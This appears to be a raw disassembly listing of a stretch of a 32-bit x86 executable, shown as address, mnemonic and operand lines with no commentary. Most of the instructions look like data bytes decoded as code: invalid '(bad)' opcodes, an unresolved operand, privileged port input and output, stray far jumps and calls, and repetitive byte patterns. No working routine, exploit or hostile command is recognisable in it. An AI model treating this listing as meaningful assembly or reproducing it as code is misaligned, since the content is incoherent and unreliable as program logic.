  41ce9e:	pop    ebx
  41ce9f:	icebp  
  41cea0:	mov    bl,0x53
  41cea2:	out    0xd4,eax
  41cea4:	mov    edi,0x2d5d7b10
  41cea9:	leave  
  41ceaa:	and    DWORD PTR [ecx],edi
  41ceac:	aam    0xfb
  41ceae:	xlat   BYTE PTR ds:[ebx]
  41ceaf:	fucom  st(2)
  41ceb1:	and    ah,BYTE PTR [eax-0x3152e9b5]
  41ceb7:	cdq    
  41ceb8:	dec    ebp
  41ceb9:	repz adc cl,BYTE PTR [ecx+0x7d920d3f]
  41cec0:	aaa    
  41cec1:	daa    
  41cec2:	push   es
  41cec3:	jb     0x41ceaf
  41cec5:	mov    ebx,ebp
  41cec7:	pop    eax
  41cec8:	jb     0x41cf1f
  41ceca:	sbb    ecx,edx
  41cecc:	fsub   st,st(3)
  41cece:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cecf:	dec    ebp
  41ced0:	imul   eax,DWORD PTR [ebx+0x621497ec],0xc2fecd90
  41ceda:	or     DWORD PTR [edx-0xb],ecx
  41cedd:	sub    al,0xf9
  41cedf:	clc    
  41cee0:	mov    ds:0x61cefe2e,eax
  41cee5:	sbb    bh,bh
  41cee7:	sbb    DWORD PTR [esi],eax
  41cee9:	xchg   esp,eax
  41ceea:	fisub  DWORD PTR [esi-0x66ea41af]
  41cef0:	enter  0x14cb,0x84
  41cef4:	pop    esp
  41cef5:	fwait
  41cef6:	xchg   dh,bl
  41cef8:	cmp    DWORD PTR [edx+eiz*2],esi
  41cefb:	mov    BYTE PTR [eax+ecx*1],dl
  41cefe:	sub    ch,al
  41cf00:	mov    edx,0x1778fe1b
  41cf05:	mov    ds:0xd2706860,al
  41cf0a:	or     bh,bh
  41cf0c:	in     al,dx
  41cf0d:	jae    0x41cf35
  41cf0f:	dec    edx
  41cf10:	pusha  
  41cf11:	sbb    ecx,DWORD PTR [edi-0x6d]
  41cf14:	dec    edx
  41cf15:	push   edi
  41cf16:	aam    0x11
  41cf18:	or     al,0x2c
  41cf1a:	(bad)  
  41cf1b:	das    
  41cf1c:	xor    BYTE PTR [ebx+esi*4-0x20499ba5],bh
  41cf23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf24:	mov    bh,0x2
  41cf26:	int    0x42
  41cf28:	sti    
	...
  41cf31:	add    BYTE PTR [eax],al
  41cf33:	add    BYTE PTR [ecx+0x46],cl
  41cf36:	sub    BYTE PTR [eax],dh
  41cf38:	das    
  41cf39:	jle    0x41cf94
  41cf3b:	jg     0x41cf03
  41cf3d:	imul   esi,eax,0xffffffd5
  41cf40:	add    al,BYTE PTR gs:[edx-0x2]
  41cf44:	xchg   DWORD PTR [ebx+0xad0001],ebp
  41cf4a:	add    BYTE PTR [eax],al
  41cf4c:	mov    edx,0xd53414e6
  41cf51:	mov    ss,ebx
  41cf53:	adc    eax,0xeddb3494
  41cf58:	dec    ebx
  41cf59:	bound  eax,QWORD PTR [ecx]
  41cf5b:	push   eax
  41cf5c:	xor    eax,0x28399c9b
  41cf61:	xchg   esp,eax
  41cf62:	loope  0x41cf43
  41cf64:	icebp  
  41cf65:	mov    bh,0xd2
  41cf67:	ins    DWORD PTR es:[edi],dx
  41cf68:	inc    edx
  41cf69:	add    dl,BYTE PTR [ebx+0x767b97e9]
  41cf6f:	arpl   WORD PTR [esi],dx
  41cf71:	xchg   ecx,eax
  41cf72:	sbb    DWORD PTR [edi-0x3d],ebx
  41cf75:	xlat   BYTE PTR ds:[ebx]
  41cf76:	sub    DWORD PTR [ebx-0x70],ebx
  41cf79:	or     al,0xe6
  41cf7b:	cmc    
  41cf7c:	jl     0x41cf9d
  41cf7e:	jg     0x41cfc6
  41cf80:	cwde   
  41cf81:	add    BYTE PTR [ecx],al
  41cf83:	dec    ebx
  41cf84:	fild   QWORD PTR [esi]
  41cf86:	inc    esp
  41cf87:	outs   dx,BYTE PTR ds:[esi]
  41cf88:	mov    dl,0x25
  41cf8a:	push   DWORD PTR [edi+0x476558d3]
  41cf90:	xor    DWORD PTR [edi-0x77],ebx
  41cf93:	cmp    bl,ch
  41cf95:	lock pop eax
  41cf97:	fdiv   DWORD PTR [edi+0x43]
  41cf9a:	add    eax,0x7a45d856
  41cf9f:	dec    ebp
  41cfa0:	lods   eax,DWORD PTR ds:[esi]
  41cfa1:	cmp    eax,esi
  41cfa3:	gs popf 
  41cfa5:	or     DWORD PTR [esi-0x43e46b43],ebp
  41cfab:	sbb    BYTE PTR [ebp-0x2f],dl
  41cfae:	mov    esi,0x71f0b914
  41cfb3:	cmp    al,0xa
  41cfb5:	lods   al,BYTE PTR fs:[esi]
  41cfb7:	pusha  
  41cfb8:	or     DWORD PTR [esp+esi*4+0x5900816],esp
  41cfbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cfc0:	mov    edi,0x2b0e3a5e
  41cfc5:	ins    DWORD PTR es:[edi],dx
  41cfc6:	adc    al,bl
  41cfc8:	out    0x27,eax
  41cfca:	loopne 0x41cfae
  41cfcc:	clc    
  41cfcd:	inc    esp
  41cfce:	push   ecx
  41cfcf:	jne    0x41cfb5
  41cfd1:	dec    edx
  41cfd2:	xchg   BYTE PTR [edx-0x66a62bd0],al
  41cfd8:	frstor ds:[eax]
  41cfdb:	mov    ecx,0xc961e08
  41cfe0:	ja     0x41d058
  41cfe2:	loopne 0x41d021
  41cfe4:	aad    0xc2
  41cfe6:	int    0x86
  41cfe8:	mov    edx,0xa1b4df61
  41cfed:	xor    al,0x51
  41cfef:	mov    BYTE PTR [ebp+0x2a],bl
  41cff2:	fsubr  DWORD PTR [ebp+0x4d572950]
  41cff8:	cmp    DWORD PTR [eax],eax
	...
  41d002:	add    BYTE PTR [eax],al
  41d004:	addr16 (bad) 
  41d006:	and    dh,dh
  41d008:	mov    eax,ds:0xe7d7f7f6
  41d00d:	mov    eax,0xea5da72
  41d012:	ficom  WORD PTR [esp+esi*1-0x54]
  41d016:	add    DWORD PTR [eax],eax
  41d018:	lods   eax,DWORD PTR ds:[esi]
  41d019:	add    BYTE PTR [eax],al
  41d01b:	add    BYTE PTR [ecx],cl
  41d01d:	pop    esp
  41d01e:	pop    es
  41d01f:	iret   
  41d020:	xor    ecx,edi
  41d022:	mov    ?,WORD PTR [edi]
  41d024:	hlt    
  41d025:	lods   al,BYTE PTR ds:[esi]
  41d026:	jo     0x41d00e
  41d028:	xor    ebp,DWORD PTR [esi+ebp*4]
  41d02b:	sbb    al,0xbf
  41d02d:	mov    ebx,0x801dba8b
  41d032:	cld    
  41d033:	sbb    ebp,DWORD PTR [edi]
  41d035:	fiadd  WORD PTR [edx+0x6a]
  41d038:	pop    edi
  41d039:	dec    edx
  41d03a:	(bad)  
  41d03b:	inc    esi
  41d03c:	mov    ebp,0x476a7c15
  41d041:	aad    0x3b
  41d043:	repnz xor eax,0x4a58477f
  41d049:	and    al,0xab
  41d04b:	mov    bh,al
  41d04d:	or     eax,DWORD PTR [esi-0x35cdebf7]
  41d053:	lds    ecx,FWORD PTR ds:[ebp-0x1bf9edf3]
  41d05a:	inc    edi
  41d05b:	inc    esi
  41d05c:	mul    al
  41d05e:	scas   al,BYTE PTR es:[edi]
  41d05f:	mov    edi,0xc941cd54
  41d064:	sbb    al,cl
  41d066:	jmp    0x41d050
  41d068:	lods   al,BYTE PTR ds:[esi]
  41d069:	xchg   esi,eax
  41d06a:	inc    esp
  41d06c:	ja     0x41d020
  41d06e:	cmp    edi,eax
  41d070:	std    
  41d071:	dec    esi
  41d072:	cmp    DWORD PTR [ebx-0x3d],ecx
  41d075:	gs pushf 
  41d077:	daa    
  41d078:	xchg   esi,eax
  41d079:	adc    ax,0x565a
  41d07d:	loop   0x41d0de
  41d07f:	sub    BYTE PTR [ecx-0x79],bh
  41d082:	push   ds
  41d083:	jl     0x41d044
  41d085:	pop    esi
  41d086:	cmp    DWORD PTR [esi+0x77],esp
  41d089:	push   edi
  41d08a:	xchg   ebx,eax
  41d08b:	mov    ebp,0xa60171b8
  41d090:	inc    edx
  41d091:	add    bl,BYTE PTR [ebp-0x7f]
  41d094:	shr    cl,1
  41d096:	scas   eax,DWORD PTR es:[edi]
  41d097:	retf   
  41d098:	icebp  
  41d099:	jg     0x41d026
  41d09b:	pop    es
  41d09c:	xchg   ecx,eax
  41d09d:	or     BYTE PTR [ebx+0x39c2b084],0xba
  41d0a4:	pop    ebx
  41d0a5:	dec    edx
  41d0a6:	or     al,0x98
  41d0a8:	mov    bl,BYTE PTR [edi-0x3bc27f56]
  41d0ae:	or     dl,BYTE PTR [edi+0x11]
  41d0b1:	cmp    al,0xc3
  41d0b3:	loope  0x41d0d7
  41d0b5:	test   DWORD PTR es:[edx],esp
  41d0b8:	fst    DWORD PTR [ebx-0x74bb4dce]
  41d0be:	adc    al,0x28
  41d0c0:	and    DWORD PTR [edi],eax
  41d0c2:	jl     0x41d120
  41d0c4:	cmp    eax,0x2c3e71c0
	...
  41d0d1:	add    BYTE PTR [eax],al
  41d0d3:	add    bl,al
  41d0d5:	or     eax,0xefee66a6
  41d0da:	ret    
  41d0db:	lods   eax,DWORD PTR ds:[esi]
  41d0dc:	sub    al,0xb8
  41d0de:	mov    ds:0xe315a247,eax
  41d0e3:	xlat   BYTE PTR ds:[ebx]
  41d0e4:	loope  0x41d092
  41d0e6:	add    DWORD PTR [eax],eax
  41d0e8:	lods   eax,DWORD PTR ds:[esi]
  41d0e9:	add    BYTE PTR [eax],al
  41d0eb:	add    BYTE PTR [eax+0x60a28fb6],al
  41d0f1:	cmp    eax,DWORD PTR [ecx-0x2d332fed]
  41d0f7:	in     eax,dx
  41d0f8:	mov    eax,ds:0xd68d375
  41d0fd:	popa   
  41d0fe:	cmp    al,0xaa
  41d100:	ds jns 0x41d092
  41d103:	loope  0x41d137
  41d105:	sbb    esp,DWORD PTR [ebp+0x5e]
  41d108:	ss inc BYTE PTR ss:[edx+0x1aa390ee]
  41d110:	xchg   edx,eax
  41d111:	loopne 0x41d132
  41d113:	pop    ss
  41d114:	jmp    0xe58377c3
  41d119:	(bad)  
  41d11a:	xor    DWORD PTR [ebp+ebx*8-0x54],ebp
  41d11e:	sbb    eax,0x5ff61974
  41d123:	and    BYTE PTR [edx-0x2e8f9dda],dl
  41d129:	mov    BYTE PTR [ebx+0x7a7fa009],al
  41d12f:	hlt    
  41d130:	scas   eax,DWORD PTR es:[edi]
  41d131:	dec    ebp
  41d132:	pop    esp
  41d133:	push   esi
  41d134:	mov    eax,ds:0xe734bf25
  41d139:	jmp    0x3a4f:0x3ddec883
  41d140:	les    edi,FWORD PTR [ebp-0x33]
  41d143:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d144:	jp     0x41d145
  41d146:	pop    edx
  41d147:	push   ecx
  41d148:	add    ecx,DWORD PTR [esi-0x72]
  41d14b:	dec    ebx
  41d14c:	loop   0x41d158
  41d14e:	(bad)  
  41d14f:	aas    
  41d150:	sti    
  41d151:	pusha  
  41d152:	in     al,0xb5
  41d154:	push   esp
  41d155:	jo     0x41d10f
  41d157:	xchg   BYTE PTR [edi-0x10288bf1],cl
  41d15d:	fisttp DWORD PTR [ecx+ebp*8+0x3336a87e]
  41d164:	push   cs
  41d165:	cs aaa 
  41d167:	sahf   
  41d168:	mov    al,BYTE PTR [edi]
  41d16a:	call   0x43f7:0x4c03672f
  41d171:	leave  
  41d172:	cld    
  41d173:	cmp    al,0xc0
  41d175:	pop    ebx
  41d176:	jns    0x41d14b
  41d178:	xchg   ebx,eax
  41d179:	lds    eax,FWORD PTR [ebp-0x69303e09]
  41d17f:	mov    cl,0xbe
  41d181:	push   ebx
  41d182:	hlt    
  41d183:	in     al,dx
  41d184:	in     al,dx
  41d185:	mov    ecx,0xc24b6553
  41d18a:	xchg   esp,eax
  41d18b:	(bad)  
  41d18c:	dec    ebp
  41d18d:	jbe    0x41d153
  41d18f:	stc    
  41d190:	(bad)  
  41d191:	xor    BYTE PTR [edi+0x516437e0],bl
  41d197:	pop    esp
  41d198:	sub    al,BYTE PTR [eax]
	...
  41d1a2:	add    BYTE PTR [eax],al
  41d1a4:	fld    st(2)
  41d1a6:	add    eax,0xddcf1f49
  41d1ab:	ror    al,cl
  41d1ad:	outs   dx,DWORD PTR ds:[esi]
  41d1ae:	clc    
  41d1af:	shr    BYTE PTR [eax+0x12],cl
  41d1b2:	xlat   BYTE PTR ds:[ebx]
  41d1b3:	out    0x8e,al
  41d1b5:	lods   eax,DWORD PTR ds:[esi]
  41d1b6:	add    DWORD PTR [eax],eax
  41d1b8:	cdq    
  41d1b9:	add    BYTE PTR [eax],al
  41d1bb:	add    BYTE PTR [esi],dl
  41d1bd:	mov    edi,0x88f578f3
  41d1c2:	mov    bh,0x86
  41d1c4:	sbb    al,0xbf
  41d1c6:	cmp    al,0xab
  41d1c8:	pop    esi
  41d1c9:	ja     0x41d17e
  41d1cb:	arpl   WORD PTR [ecx-0x9],bx
  41d1ce:	xchg   esi,edi
  41d1d0:	es hlt 
  41d1d2:	ins    DWORD PTR es:[edi],dx
  41d1d3:	mov    ebx,0x59684b18
  41d1d8:	pop    ss
  41d1d9:	xchg   edi,eax
  41d1da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d1db:	dec    ecx
  41d1dc:	sub    eax,0xdc2ede64
  41d1e1:	in     al,0xc4
  41d1e3:	pop    ebx
  41d1e4:	cli    
  41d1e5:	adc    bh,0xa3
  41d1e8:	xchg   edi,eax
  41d1e9:	mov    ah,0xd9
  41d1eb:	mov    eax,0xa5253cd6
  41d1f0:	cld    
  41d1f1:	dec    eax
  41d1f2:	jg     0x41d185
  41d1f4:	mov    esi,0xa09fd1e9
  41d1f9:	xchg   ebp,eax
  41d1fa:	adc    al,0xa2
  41d1fc:	adc    ah,dl
  41d1fe:	aas    
  41d1ff:	fist   WORD PTR [ebp-0x26]
  41d202:	add    eax,0x52faabc0
  41d207:	iret   
  41d208:	aas    
  41d209:	mov    eax,ds:0x870289c7
  41d20e:	fdiv   st(6),st
  41d210:	adc    al,BYTE PTR [ebx-0xf]
  41d213:	sub    DWORD PTR [edi-0x25],edx
  41d216:	fsub   QWORD PTR [esp+edi*1+0x52]
  41d21a:	mov    dh,0x59
  41d21c:	mov    bl,0xfb
  41d21e:	add    ah,bh
  41d220:	sbb    DWORD PTR [ebp-0x26],0xffffff8b
  41d224:	mov    cl,0xf3
  41d226:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d227:	clc    
  41d228:	outs   dx,BYTE PTR ds:[esi]
  41d229:	scas   al,BYTE PTR es:[edi]
  41d22a:	jb     0x41d28b
  41d22c:	cs daa 
  41d22e:	push   es
  41d22f:	xchg   ebp,eax
  41d230:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d231:	jnp    0x41d206
  41d233:	and    edi,ebx
  41d235:	ins    BYTE PTR es:[edi],dx
  41d236:	fist   DWORD PTR [edi+0x52d0d933]
  41d23c:	mov    bh,0x20
  41d23e:	outs   dx,BYTE PTR ds:[esi]
  41d23f:	fdiv   QWORD PTR [ebp+0x1f]
  41d242:	cld    
  41d243:	test   BYTE PTR [eax+0x43],cl
  41d246:	iret   
  41d247:	pop    ss
  41d248:	lds    eax,FWORD PTR [edi-0x36a4e2bb]
  41d24e:	pushf  
  41d24f:	mov    BYTE PTR [edi],ch
  41d251:	and    al,0xec
  41d253:	xchg   esi,eax
  41d254:	pop    es
	...
  41d265:	pusha  
  41d266:	inc    edx
  41d267:	add    BYTE PTR [eax+eiz*2],al
  41d26a:	inc    edx
  41d26b:	add    BYTE PTR [eax],cl
  41d26d:	pusha  
  41d26e:	inc    edx
  41d26f:	add    BYTE PTR [eax+eiz*2],cl
  41d272:	inc    edx
  41d273:	add    BYTE PTR [eax],dl
  41d275:	pusha  
  41d276:	inc    edx
  41d277:	add    BYTE PTR [eax+eiz*2],dl
  41d27a:	inc    edx
  41d27b:	add    BYTE PTR [eax],bl
  41d27d:	pusha  
  41d27e:	inc    edx
  41d27f:	add    BYTE PTR [eax+eiz*2],bl
  41d282:	inc    edx
  41d283:	add    BYTE PTR [eax],al
  41d285:	jo     0x41d2c9
  41d287:	add    BYTE PTR [eax+esi*2],al
  41d28a:	inc    edx
  41d28b:	add    BYTE PTR [eax],cl
  41d28d:	jo     0x41d2d1
  41d28f:	add    BYTE PTR [eax+esi*2],cl
  41d292:	inc    edx
  41d293:	add    BYTE PTR [eax],dl
  41d295:	jo     0x41d2d9
  41d297:	add    BYTE PTR [eax+esi*2],dl
  41d29a:	inc    edx
  41d29b:	add    BYTE PTR [eax],bl
  41d29d:	jo     0x41d2e1
  41d29f:	add    BYTE PTR [eax+esi*2],bl
  41d2a2:	inc    edx
  41d2a3:	add    BYTE PTR [eax],al
  41d2a5:	add    BYTE PTR [edx+0x0],0x4
  41d2a9:	add    BYTE PTR [edx+0x0],0x8
  41d2ad:	add    BYTE PTR [edx+0x0],0xc
  41d2b1:	add    BYTE PTR [edx+0x0],0x10
  41d2b5:	add    BYTE PTR [edx+0x0],0x14
  41d2b9:	add    BYTE PTR [edx+0x0],0x18
  41d2bd:	add    BYTE PTR [edx+0x0],0x1c
  41d2c1:	add    BYTE PTR [edx+0x0],0x78
  41d2c5:	data16 ins BYTE PTR es:[edi],dx
  41d2c7:	jp     0x41d320
  41d2c9:	jbe    0x41d312
  41d2cb:	ja     0x41d310
  41d2cd:	js     0x41d317
  41d2cf:	jno    0x41d321
  41d2d1:	arpl   WORD PTR [ebx+0x6f],dx
  41d2d4:	inc    edi
  41d2d5:	dec    esi
  41d2d6:	outs   dx,DWORD PTR ds:[esi]
  41d2d7:	pop    ecx
  41d2d8:	inc    edi
  41d2d9:	jb     0x41d322
  41d2db:	jns    0x41d353
  41d2dd:	inc    ecx
  41d2de:	pop    eax
  41d2df:	dec    esp
  41d2e0:	add    BYTE PTR [eax],al
  41d2e2:	add    BYTE PTR [eax],al
  41d2e4:	ins    BYTE PTR es:[edi],dx
  41d2e5:	(bad)  
  41d2e6:	inc    ecx
  41d2e7:	add    BYTE PTR [esi+edx*8+0x41],dh
  41d2eb:	add    BYTE PTR [edx*8+0xbef0041],ch
  41d2f2:	mov    dl,0xe
  41d2f4:	jns    0x41d344
  41d2f6:	xor    BYTE PTR [esi-0x79],cl
  41d2f9:	dec    edi
  41d2fa:	cmp    eax,0x3e4faf4e
  41d2ff:	dec    esi
  41d300:	js     0x41d350
  41d302:	cmp    ecx,DWORD PTR [esi-0x64]
  41d305:	dec    edi
  41d306:	inc    esp
  41d307:	dec    esi
  41d308:	jae    0x41d358
  41d30a:	inc    ecx
  41d30b:	dec    esi
  41d30c:	xor    BYTE PTR [esi+0x40],cl
  41d30f:	dec    esi
  41d310:	pop    esp
  41d311:	pop    ebp
  41d312:	pop    edi
  41d313:	push   edx
  41d314:	cmp    DWORD PTR [esi+0x79],ecx
  41d317:	dec    esi
  41d318:	xor    BYTE PTR [esi-0x79],cl
  41d31b:	dec    edi
  41d31c:	cmp    eax,0x3e4faf4e
  41d321:	dec    esi
  41d322:	js     0x41d372
  41d324:	cmp    ecx,DWORD PTR [esi-0x64]
  41d327:	dec    edi
  41d328:	inc    esp
  41d329:	dec    esi
  41d32a:	mov    DWORD PTR [edi+0x41],ecx
  41d32d:	dec    esi
  41d32e:	xor    BYTE PTR [esi+0x40],cl
  41d331:	dec    esi
  41d332:	pop    esp
  41d333:	ins    DWORD PTR es:[edi],dx
  41d334:	pop    edi
  41d335:	bound  edi,QWORD PTR [ecx]
  41d337:	dec    esi
  41d338:	jns    0x41d388
  41d33a:	xor    BYTE PTR [esi-0x80],cl
  41d33d:	dec    edi
  41d33e:	cmp    eax,0x394e734e
  41d343:	dec    esi
  41d344:	mov    ds:0x304e3a4f,al
  41d349:	dec    esi
  41d34a:	inc    esi
  41d34b:	dec    esi
  41d34c:	pop    esp
  41d34d:	jge    0x41d3ae
  41d34f:	jb     0x41d3c0
  41d351:	sub    BYTE PTR [esi-0x7d],0x7e
  41d355:	xchg   ebx,eax
  41d356:	jns    0x41d2e8
  41d358:	aas    
  41d359:	dec    esi
  41d35a:	test   BYTE PTR [edi+0x30],cl
  41d35d:	dec    esi
  41d35e:	test   BYTE PTR [edi+0x3c],cl
  41d361:	dec    esi
  41d362:	mov    ds:0x734e394f,al
  41d367:	dec    esi
  41d368:	inc    ebp
  41d369:	dec    esi
  41d36a:	xor    BYTE PTR [esi+0x44],cl
  41d36d:	dec    esi
  41d36e:	pop    esp
  41d36f:	lea    ebx,[edi-0x7e]
  41d372:	outs   dx,DWORD PTR ds:[esi]
  41d373:	xchg   edx,eax
  41d374:	outs   dx,BYTE PTR ds:[esi]
  41d375:	xchg   ebx,eax
  41d376:	jle    0x41d31b
  41d378:	jns    0x41d31a
  41d37a:	aas    
  41d37b:	dec    esi
  41d37c:	test   BYTE PTR [edi+0x30],cl
  41d37f:	dec    esi
  41d380:	test   BYTE PTR [edi+0x3c],cl
  41d383:	dec    esi
  41d384:	mov    ds:0x894e394f,al
  41d389:	dec    edi
  41d38a:	inc    ebp
  41d38b:	dec    esi
  41d38c:	xor    BYTE PTR [esi+0x44],cl
  41d38f:	dec    esi
  41d390:	pop    esp
  41d391:	popf   
  41d392:	pop    edi
  41d393:	xchg   edx,eax
  41d394:	outs   dx,DWORD PTR ds:[esi]
  41d395:	mov    ds:0xb37ea36e,al
  41d39a:	jns    0x41d34c
  41d39c:	aas    
  41d39d:	dec    esi
  41d39e:	mov    cs,WORD PTR [edi+0x30]
  41d3a1:	dec    esi
  41d3a2:	lods   al,BYTE PTR ds:[esi]
  41d3a3:	dec    edi
  41d3a4:	cmp    eax,0x394e734e
  41d3a9:	dec    esi
  41d3aa:	mov    eax,ds:0x304e3a4f
  41d3af:	dec    esi
  41d3b0:	inc    esp
  41d3b1:	dec    esi
  41d3b2:	pop    esp
  41d3b3:	lods   eax,DWORD PTR ds:[esi]
  41d3b4:	pop    edi
  41d3b5:	mov    ds:0xb36eb26f,al
  41d3ba:	jle    0x41d37f
  41d3bc:	jns    0x41d37e
  41d3be:	aas    
  41d3bf:	dec    esi
  41d3c0:	mov    cs,WORD PTR [edi+0x30]
  41d3c3:	dec    esi
  41d3c4:	lods   al,BYTE PTR ds:[esi]
  41d3c5:	dec    edi
  41d3c6:	cmp    eax,0x394e7e4e
  41d3cb:	dec    esi
  41d3cc:	lahf   
  41d3cd:	dec    edi
  41d3ce:	cmp    ecx,DWORD PTR [esi+0x30]
  41d3d1:	dec    esi
  41d3d2:	inc    ebp
  41d3d3:	dec    esi
  41d3d4:	pop    esp
  41d3d5:	mov    ebp,0xc26fb25f
  41d3da:	outs   dx,BYTE PTR ds:[esi]
  41d3db:	ret    
  41d3dc:	jle    0x41d3b1
  41d3de:	jns    0x41d3b0
  41d3e0:	aas    
  41d3e1:	dec    esi
  41d3e2:	mov    cs,WORD PTR [edi+0x30]
  41d3e5:	dec    esi
  41d3e6:	lods   al,BYTE PTR ds:[esi]
  41d3e7:	dec    edi
  41d3e8:	cmp    eax,0x394f804e
  41d3ed:	dec    esi
  41d3ee:	lods   al,BYTE PTR ds:[esi]
  41d3ef:	dec    edi
  41d3f0:	cmp    cl,BYTE PTR [esi+0x30]
  41d3f3:	dec    esi
  41d3f4:	inc    esi
  41d3f5:	dec    esi
  41d3f6:	pop    esp
  41d3f7:	int    0x5f
  41d3f9:	ret    0xd26f
  41d3fc:	outs   dx,BYTE PTR ds:[esi]
  41d3fd:	sar    DWORD PTR [esi-0x1d],cl
  41d400:	jns    0x41d3e2
  41d402:	aas    
  41d403:	dec    esi
  41d404:	mov    cs,WORD PTR [edi+0x30]
  41d407:	dec    esi
  41d408:	lods   al,BYTE PTR ds:[esi]
  41d409:	dec    edi
  41d40a:	cmp    eax,0x394f834e
  41d40f:	dec    esi
  41d410:	mov    ds:0x304e3a4f,al
  41d415:	dec    esi
  41d416:	inc    esp
  41d417:	dec    esi
  41d418:	pop    esp
  41d419:	fstp   QWORD PTR [edi-0x2e]
  41d41c:	outs   dx,DWORD PTR ds:[esi]
  41d41d:	loop   0x41d48d
  41d41f:	jecxz  0x41d49f
  41d421:	repz jns 0x41d414
  41d424:	aas    
  41d425:	dec    esi
  41d426:	lea    ecx,[edi+0x30]
  41d429:	dec    esi
  41d42a:	lahf   
  41d42b:	dec    edi
  41d42c:	cmp    eax,0x3c4fa04e
  41d431:	dec    esi
  41d432:	xor    BYTE PTR [esi+0x3f],cl
  41d435:	dec    esi
  41d436:	pop    esp
  41d437:	in     eax,dx
  41d438:	pop    edi
  41d439:	loop   0x41d4aa
  41d43b:	repnz outs dx,BYTE PTR ds:[esi]
  41d43d:	repz jle 0x41d443
  41d440:	jns    0x41d442
  41d442:	jle    0x41d457
  41d444:	jns    0x41d456
  41d446:	cmp    al,0x4e
  41d448:	jg     0x41d498
  41d44a:	xor    BYTE PTR [esi-0x65],cl
  41d44d:	dec    edi
  41d44e:	xor    cl,BYTE PTR [esi-0x80]
  41d451:	dec    edi
  41d452:	cmp    al,0x4e
  41d454:	lods   eax,DWORD PTR ds:[esi]
  41d455:	dec    edi
  41d456:	cmp    ecx,DWORD PTR [esi+0x30]
  41d459:	dec    esi
  41d45a:	inc    ebp
  41d45b:	dec    esi
  41d45c:	pop    esp
  41d45d:	or     eax,0x126f025f
  41d462:	outs   dx,BYTE PTR ds:[esi]
  41d463:	adc    edi,DWORD PTR [esi+0x23]
  41d466:	jns    0x41d488
  41d468:	aas    
  41d469:	dec    esi
  41d46a:	add    BYTE PTR [eax],al
  41d46c:	hlt    
  41d46d:	rol    BYTE PTR [ecx+0x0],cl
  41d470:	call   0xf0421649
  41d475:	aam    0x41
  41d477:	add    BYTE PTR [eax-0x2a],bh
  41d47a:	inc    ecx
  41d47b:	add    ah,ah
  41d47d:	aad    0x41
  41d47f:	add    BYTE PTR [eax-0x2a],ch
  41d482:	inc    ecx
  41d483:	add    al,dl
  41d485:	aam    0x41
  41d487:	add    ah,dl
  41d489:	aam    0x41
  41d48b:	add    BYTE PTR [esi+edx*8+0x41],ah
  41d48f:	add    BYTE PTR [eax],bh
  41d491:	aad    0x41
  41d493:	add    BYTE PTR ds:0x36f89ca9,cl
  41d499:	mov    edx,0xd4ecf89c
  41d49e:	inc    ecx
  41d49f:	add    BYTE PTR [ebp+edx*8-0x2a4fffbf],bl
  41d4a6:	inc    ecx
  41d4a7:	add    BYTE PTR [ebp+edx*8-0x2a33ffbf],bh
  41d4ae:	inc    ecx
  41d4af:	add    BYTE PTR [edx*8-0x2d0fffbf],ah
  41d4b6:	inc    ecx
  41d4b7:	add    BYTE PTR [ebp+edx*8+0x41],al
  41d4bb:	add    BYTE PTR [edx*8-0x2983ffbf],dh
  41d4c2:	inc    ecx
  41d4c3:	add    BYTE PTR [esi+0x19f89c85],dh
  41d4c9:	or     edx,DWORD PTR [edi]
  41d4cb:	cmp    eax,0x140041d4
  41d4d1:	sbb    al,0x16
  41d4d3:	or     DWORD PTR [eax],0x7050d
  41d4d9:	add    BYTE PTR [eax+0x0],al
  41d4dc:	cmp    al,BYTE PTR [edx+0x3e]
  41d4df:	ds retf 0x4247
  41d4e3:	add    BYTE PTR [ebp+0x55],ch
  41d4e6:	inc    esp
  41d4e7:	imul   ecx,DWORD PTR [eax],0x86275fa
  41d4ed:	in     eax,dx
  41d4ee:	inc    BYTE PTR [edi]
  41d4f0:	aas    
  41d4f1:	cli    
  41d4f2:	mov    ds:0x41d4e005,eax
  41d4f7:	add    BYTE PTR [ebp-0x4a07636b],dh
  41d4fd:	xchg   esi,eax
  41d4fe:	pushf  
  41d4ff:	clc    
  41d500:	mov    ah,0x95
  41d502:	pushf  
  41d503:	clc    
  41d504:	mov    ebx,0xbaf89c95
  41d509:	xchg   ebp,eax
  41d50a:	pushf  
  41d50b:	clc    
  41d50c:	mov    ecx,0xb8f89c95
  41d511:	xchg   ebp,eax
  41d512:	pushf  
  41d513:	clc    
  41d514:	mov    edi,0xbef89c95
  41d519:	xchg   ebp,eax
  41d51a:	pushf  
  41d51b:	clc    
  41d51c:	mov    ebp,0xa6f89c95
  41d521:	xchg   ebp,eax
  41d522:	pushf  
  41d523:	clc    
  41d524:	jmp    0x41d2:0xe86003f9
  41d52b:	add    BYTE PTR [eax+edx*1+0x77530042],cl
  41d532:	jbe    0x41d584
  41d534:	mov    dh,0x85
  41d536:	pushf  
  41d537:	clc    
  41d538:	sbb    ecx,ebp
  41d53a:	push   eax
  41d53b:	pop    es
  41d53c:	es pop es
  41d53e:	add    BYTE PTR [eax],al
  41d540:	in     al,0xd2
  41d542:	inc    ecx
  41d543:	add    BYTE PTR [ebx],bl
  41d545:	or     eax,DWORD PTR [esi+ecx*1]
	...
  41d578:	mov    WORD PTR [eax],ss
  41d57a:	inc    edx
  41d57b:	add    BYTE PTR [esi+0x67f89c85],dh
  41d581:	pushw  0x68
  41d584:	addr16 push 0x67
  41d587:	pushw  0x6b6a
  41d58b:	push   0x676b67
	...
  41d598:	es aas 
  41d59a:	inc    eax
  41d59b:	add    BYTE PTR [ebp-0x5db060b1],ah
  41d5a1:	dec    edi
  41d5a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5a3:	dec    edi
  41d5a4:	lahf   
  41d5a5:	dec    edi
  41d5a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d5a7:	dec    edi
  41d5a8:	ins    DWORD PTR es:[edi],dx
  41d5a9:	dec    esi
  41d5aa:	bound  ecx,QWORD PTR [esi+0x30]
  41d5ad:	dec    esi
  41d5ae:	add    BYTE PTR [eax],al
  41d5b0:	cdq    
  41d5b1:	dec    edi
  41d5b2:	pushf  
  41d5b3:	dec    edi
  41d5b4:	fwait
